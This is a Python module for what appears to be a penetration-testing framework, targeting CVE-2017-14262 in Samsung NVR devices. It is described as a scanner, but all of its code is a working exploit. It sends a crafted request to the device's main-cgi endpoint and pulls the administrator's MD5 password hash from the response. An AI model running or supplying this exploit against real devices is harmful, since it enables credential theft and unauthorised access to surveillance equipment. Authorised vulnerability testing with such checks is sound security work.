import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "samsung/cve_2017_14262_scan"
        self.description = "Vulnerability scanner for Samsung NVR credential disclosure."
        self.type = "scan"
        self.options = {"TARGET": {"required": True, "value": ""}}

    async def run(self):
        target = self.options["TARGET"]["value"]
        url = f"http://{target}/cgi-bin/main-cgi"
        
        payload = {"cmd": 201, "szUserName_Qry": "admin", "szUserName": "", "u32UserLoginHandle": 0}
        
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                response = await client.post(url, json=payload)
                if response.status_code == 200 and "szLoginPasswd" in response.json():
                    md5 = response.json()["szLoginPasswd"]
                    return {"vulnerable": True, "details": f"Found MD5 Hash: {md5}"}
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
